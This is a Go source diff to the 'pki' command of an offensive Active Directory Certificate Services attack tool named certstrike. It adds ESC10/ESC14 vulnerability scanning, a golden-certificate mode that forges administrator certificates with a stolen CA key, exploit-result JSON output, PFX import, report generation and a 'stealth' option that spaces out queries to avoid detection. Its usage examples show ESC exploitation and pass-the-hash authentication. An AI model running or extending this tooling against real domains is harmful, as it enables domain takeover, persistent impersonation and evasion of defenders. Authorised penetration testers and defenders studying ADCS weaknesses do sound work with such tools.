@@ -5,6 +5,7 @@ import (
 	"crypto/elliptic"
 	"crypto/rand"
 	"crypto/x509"
+	"encoding/json"
 	"encoding/pem"
 	"fmt"
 	"os"
@@ -17,27 +18,43 @@ import (
 var pkiCmd = &cobra.Command{
 	Use:   "pki",
 	Short: "Advanced Certificate/PKI attack toolkit",
-	Long: `ADCS enumeration (ESC1-ESC11, ESC13), golden certificate forging, ESC exploitation, and mTLS interception.
+	Long: `ADCS enumeration (ESC1-ESC14), golden certificate forging, ESC exploitation, PFX import, and engagement reporting.
 
 Examples:
   certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --username user --password pass
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --ldaps --username user --password pass
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --start-tls --username user --password pass
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --json --username user --password pass
+  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --stealth --username user --password pass
   certstrike pki --forge --upn administrator@corp.local --ca-key ca-key.pem --output admin-cert.pem
+  certstrike pki --forge --upn administrator@corp.local --ca-key ca-key.pem --ca-cert ca-cert.pem --output golden.pem
   certstrike pki --exploit esc1 --template VulnTemplate --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
   certstrike pki --exploit esc4 --template WritableTemplate --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
   certstrike pki --exploit esc8 --template Machine --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
   certstrike pki --exploit esc9 --template NoSecExtTemplate --upn admin@domain.com --attacker-dn CN=attacker,CN=Users,DC=corp,DC=local --target-dc dc01.corp.local --domain corp.local
   certstrike pki --exploit esc13 --template LinkedPolicyTemplate --upn user@domain.com --target-dc dc01.corp.local --domain corp.local
-  certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local`,
+  certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local
+  certstrike pki --import-pfx cert.pfx --pfx-password pass
+  certstrike pki --import-pfx cert.pfx --json
+  certstrike pki --report --format markdown --output findings.md --target-dc dc01.corp.local --domain corp.local --username user --password pass`,
 	RunE: func(cmd *cobra.Command, args []string) error {
 		doEnum, _ := cmd.Flags().GetBool("enum")
 		doForge, _ := cmd.Flags().GetBool("forge")
 		exploit, _ := cmd.Flags().GetString("exploit")
 		doAutoDetect, _ := cmd.Flags().GetBool("auto-detect")
+		importPFX, _ := cmd.Flags().GetString("import-pfx")
+		doReport, _ := cmd.Flags().GetBool("report")
 
-		if !doEnum && !doForge && exploit == "" && !doAutoDetect {
+		if !doEnum && !doForge && exploit == "" && !doAutoDetect && importPFX == "" && !doReport {
 			return cmd.Help()
 		}
 
+		if importPFX != "" {
+			return runImportPFX(cmd, importPFX)
+		}
+		if doReport {
+			return runReport(cmd)
+		}
 		if doAutoDetect {
 			return runAutoDetect(cmd)
 		}
@@ -60,12 +77,26 @@ func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
 	username, _ := cmd.Flags().GetString("username")
 	password, _ := cmd.Flags().GetString("password")
 	hash, _ := cmd.Flags().GetString("hash")
-	useTLS, _ := cmd.Flags().GetBool("tls")
+	useTLS, _ := cmd.Flags().GetBool("ldaps")
+	useStartTLS, _ := cmd.Flags().GetBool("start-tls")
+	outputJSON, _ := cmd.Flags().GetBool("json")
+	stealth, _ := cmd.Flags().GetBool("stealth")
+
+	// Legacy --tls flag support (maps to --ldaps)
+	if legacyTLS, _ := cmd.Flags().GetBool("tls"); legacyTLS {
+		useTLS = true
+	}
 
 	return &pki.ADCSConfig{
-		TargetDC: targetDC, Domain: domain,
-		Username: username, Password: password,
-		Hash: hash, UseTLS: useTLS,
+		TargetDC:    targetDC,
+		Domain:      domain,
+		Username:    username,
+		Password:    password,
+		Hash:        hash,
+		UseTLS:      useTLS,
+		UseStartTLS: useStartTLS,
+		OutputJSON:  outputJSON,
+		Stealth:     stealth,
 	}
 }
 
@@ -73,6 +104,20 @@ func runEnumerate(cmd *cobra.Command) error {
 	cfg := buildADCSConfig(cmd)
 	if cfg.TargetDC == "" || cfg.Domain == "" {
 		return fmt.Errorf("--target-dc and --domain are required for enumeration")
+	}
+
+	// JSON mode: use EnumerateAll for structured output
+	if cfg.OutputJSON {
+		result, err := pki.EnumerateAll(cfg)
+		if err != nil {
+			return fmt.Errorf("enumeration failed: %w", err)
+		}
+		data, err := json.MarshalIndent(result, "", "  ")
+		if err != nil {
+			return fmt.Errorf("marshal JSON: %w", err)
+		}
+		fmt.Println(string(data))
+		return nil
 	}
 
 	templates, err := pki.EnumerateTemplates(cfg)
@@ -185,6 +230,34 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
+	// ESC10: Weak certificate mapping methods
+	fmt.Println("\n[*] Scanning for ESC10 (weak certificate mapping methods)...")
+	esc10Findings, err := pki.ScanESC10(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC10 scan failed: %v\n", err)
+	} else if len(esc10Findings) == 0 {
+		fmt.Println("[+] ESC10: Certificate mapping methods are not weak.")
+	} else {
+		fmt.Printf("\n[!] ESC10 VULNERABLE — %d finding(s):\n\n", len(esc10Findings))
+		for _, f := range esc10Findings {
+			enforcement := "unknown"
+			switch f.BindingEnforcement {
+			case 0:
+				enforcement = "Disabled (EXPLOITABLE)"
+			case 1:
+				enforcement = "Compatibility mode (EXPLOITABLE)"
+			case 2:
+				enforcement = "Full enforcement (mitigated)"
+			}
+			fmt.Printf("    Mapping Methods:     0x%02x\n", f.MappingMethods)
+			fmt.Printf("    UPN Mapping:         %v\n", f.UPNMappingEnabled)
+			fmt.Printf("    S4U2Self Mapping:    %v\n", f.S4U2SelfEnabled)
+			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
+			fmt.Printf("    Vulnerable Templates (%d): %s\n", len(f.VulnerableTemplates), strings.Join(f.VulnerableTemplates, ", "))
+			fmt.Println()
+		}
+	}
+
 	// ESC13: OID group link abuse via msDS-OIDToGroupLink
 	fmt.Println("\n[*] Scanning for ESC13 (OID group link abuse)...")
 	esc13Findings, err := pki.ScanESC13(cfg)
@@ -202,12 +275,41 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
+	// ESC14: Weak explicit mappings via altSecurityIdentities
+	fmt.Println("\n[*] Scanning for ESC14 (weak explicit mappings via altSecurityIdentities)...")
+	esc14Findings, err := pki.ScanESC14(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC14 scan failed: %v\n", err)
+	} else if len(esc14Findings) == 0 {
+		fmt.Println("[+] ESC14: No schema v1 templates with weak mapping found.")
+	} else {
+		fmt.Printf("\n[!] ESC14 VULNERABLE — %d finding(s):\n\n", len(esc14Findings))
+		for _, f := range esc14Findings {
+			enforcement := "unknown"
+			switch f.BindingEnforcement {
+			case 0:
+				enforcement = "Disabled (EXPLOITABLE)"
+			case 1:
+				enforcement = "Compatibility mode (EXPLOITABLE)"
+			case 2:
+				enforcement = "Full enforcement (mitigated)"
+			}
+			fmt.Printf("    Template:            %s\n", f.TemplateName)
+			fmt.Printf("    Schema Version:      %d\n", f.SchemaVersion)
+			fmt.Printf("    Explicit Mapping:    %v\n", f.AllowsExplicitMapping)
+			fmt.Printf("    Strong Mapping Req:  %v\n", f.StrongMappingRequired)
+			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
+			fmt.Println()
+		}
+	}
+
 	return nil
 }
 
 func runForge(cmd *cobra.Command) error {
 	upn, _ := cmd.Flags().GetString("upn")
 	caKeyPath, _ := cmd.Flags().GetString("ca-key")
+	caCertPath, _ := cmd.Flags().GetString("ca-cert")
 	output, _ := cmd.Flags().GetString("output")
 
 	if upn == "" {
@@ -217,6 +319,42 @@ func runForge(cmd *cobra.Command) error {
 		output = "forged-cert.pem"
 	}
 
+	// Strip .pem extension for base path if present
+	basePath := strings.TrimSuffix(output, ".pem")
+	basePath = strings.TrimSuffix(basePath, ".crt")
+
+	// Golden Certificate mode: both --ca-key and --ca-cert provided
+	// Uses ForgeGoldenCertificate to sign with real CA key and chain to real CA cert
+	if caKeyPath != "" && caCertPath != "" {
+		fmt.Println("[!] Golden Certificate mode: signing with real CA key + cert")
+		caCert, caKey, err := pki.LoadCACertAndKey(caCertPath, caKeyPath)
+		if err != nil {
+			return fmt.Errorf("load CA material: %w", err)
+		}
+
+		cert, certKey, err := pki.ForgeGoldenCertificate(caKey, caCert, upn)
+		if err != nil {
+			return fmt.Errorf("forge golden certificate: %w", err)
+		}
+
+		if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
+			return fmt.Errorf("write certificate: %w", err)
+		}
+		pfxPassword, _ := cmd.Flags().GetString("pfx-password")
+		if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
+			fmt.Printf("[!] PFX export failed: %v\n", err)
+		}
+
+		fmt.Printf("[+] Golden certificate (CA-signed) written to %s.crt / %s.pfx\n", basePath, basePath)
+		fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
+		fmt.Printf("    Issuer:  %s\n", cert.Issuer.CommonName)
+		fmt.Printf("    UPN: %s\n", upn)
+		fmt.Printf("    Serial: %s\n", cert.SerialNumber.Text(16))
+		fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
+		return nil
+	}
+
+	// Self-signed mode: original ForgeCertificate behavior
 	var caKey *ecdsa.PrivateKey
 
 	if caKeyPath != "" {
@@ -256,9 +394,6 @@ func runForge(cmd *cobra.Command) error {
 		return fmt.Errorf("forge certificate: %w", err)
 	}
 
-	// Strip .pem extension for base path if present
-	basePath := strings.TrimSuffix(output, ".pem")
-	basePath = strings.TrimSuffix(basePath, ".crt")
 	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
 		return fmt.Errorf("write certificate: %w", err)
 	}
@@ -352,6 +487,24 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		fmt.Printf("[!] PFX export failed: %v\n", err)
 	}
 
+	if cfg.OutputJSON {
+		result := pki.ExploitResult{
+			Exploit:   strings.ToUpper(exploit),
+			Template:  templateName,
+			TargetUPN: upn,
+			CertPath:  basePath + ".crt",
+			KeyPath:   basePath + ".key",
+			PFXPath:   basePath + ".pfx",
+			Success:   true,
+		}
+		data, err := json.MarshalIndent(result, "", "  ")
+		if err != nil {
+			return fmt.Errorf("marshal JSON: %w", err)
+		}
+		fmt.Println(string(data))
+		return nil
+	}
+
 	fmt.Printf("\n[+] Exploitation successful!\n")
 	fmt.Printf("    Exploit: %s\n", strings.ToUpper(exploit))
 	fmt.Printf("    Template: %s\n", templateName)
@@ -391,23 +544,102 @@ func runAutoDetect(cmd *cobra.Command) error {
 	return nil
 }
 
+func runImportPFX(cmd *cobra.Command, pfxPath string) error {
+	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
+	outputJSON, _ := cmd.Flags().GetBool("json")
+
+	if outputJSON {
+		info, err := pki.LoadPFXInfo(pfxPath, pfxPassword)
+		if err != nil {
+			return fmt.Errorf("load PFX: %w", err)
+		}
+		data, err := json.MarshalIndent(info, "", "  ")
+		if err != nil {
+			return fmt.Errorf("marshal JSON: %w", err)
+		}
+		fmt.Println(string(data))
+		return nil
+	}
+
+	_, _, err := pki.LoadPFX(pfxPath, pfxPassword)
+	if err != nil {
+		return fmt.Errorf("load PFX: %w", err)
+	}
+	return nil
+}
+
+func runReport(cmd *cobra.Command) error {
+	cfg := buildADCSConfig(cmd)
+	if cfg.TargetDC == "" || cfg.Domain == "" {
+		return fmt.Errorf("--target-dc and --domain are required for report generation")
+	}
+
+	reportFormat, _ := cmd.Flags().GetString("format")
+	if reportFormat == "" {
+		reportFormat = "markdown"
+	}
+
+	output, _ := cmd.Flags().GetString("output")
+	if output == "" {
+		output = "findings.md"
+	}
+
+	fmt.Printf("[*] Running full ADCS enumeration for report...\n")
+	result, err := pki.EnumerateAll(cfg)
+	if err != nil {
+		return fmt.Errorf("enumeration failed: %w", err)
+	}
+
+	reportData, err := pki.GenerateReport(result, reportFormat)
+	if err != nil {
+		return fmt.Errorf("generate report: %w", err)
+	}
+
+	if err := os.WriteFile(output, reportData, 0600); err != nil {
+		return fmt.Errorf("write report: %w", err)
+	}
+
+	fmt.Printf("[+] Report written to %s (%d bytes)\n", output, len(reportData))
+	fmt.Printf("    Format:    %s\n", reportFormat)
+	fmt.Printf("    Templates: %d\n", len(result.Templates))
+	fmt.Printf("    Findings:  %d\n", result.VulnCount)
+	return nil
+}
+
 func init() {
 	rootCmd.AddCommand(pkiCmd)
 
+	// Action flags
 	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
 	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
 	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc4, esc8, esc9, esc13)")
 	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
+	pkiCmd.Flags().String("import-pfx", "", "Import and display info from a PKCS12/PFX file")
+	pkiCmd.Flags().Bool("report", false, "Generate engagement report from full ADCS enumeration")
+
+	// Connection flags
 	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
 	pkiCmd.Flags().String("domain", "", "Active Directory domain name")
 	pkiCmd.Flags().String("username", "", "Domain username for authentication")
 	pkiCmd.Flags().String("password", "", "Domain password for authentication")
 	pkiCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash authentication")
+	pkiCmd.Flags().Bool("tls", false, "Use LDAPS (port 636) — legacy alias for --ldaps")
+	pkiCmd.Flags().Bool("ldaps", false, "Use LDAPS (port 636) with TLS from connection start")
+	pkiCmd.Flags().Bool("start-tls", false, "Use StartTLS (connect to port 389 then upgrade to TLS)")
+
+	// Certificate flags
 	pkiCmd.Flags().String("upn", "", "User Principal Name for certificate forging")
 	pkiCmd.Flags().String("ca-key", "", "Path to CA private key PEM file")
+	pkiCmd.Flags().String("ca-cert", "", "Path to CA certificate PEM file (with --ca-key, enables golden certificate mode)")
 	pkiCmd.Flags().String("template", "", "Certificate template name for exploitation")
-	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
-	pkiCmd.Flags().Bool("tls", false, "Use LDAPS (port 636) instead of LDAP (port 389)")
 	pkiCmd.Flags().String("pfx-password", "", "Password for PFX archive (default: empty/unencrypted)")
 	pkiCmd.Flags().String("attacker-dn", "", "Attacker's LDAP DN for ESC9 exploitation (e.g., CN=attacker,CN=Users,DC=corp,DC=local)")
+
+	// Output flags
+	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
+	pkiCmd.Flags().Bool("json", false, "Output results as JSON instead of human-readable text")
+	pkiCmd.Flags().String("format", "markdown", "Report format (markdown)")
+
+	// Operational flags
+	pkiCmd.Flags().Bool("stealth", false, "Enable stealth mode: random delays between queries, smaller page sizes")
 }
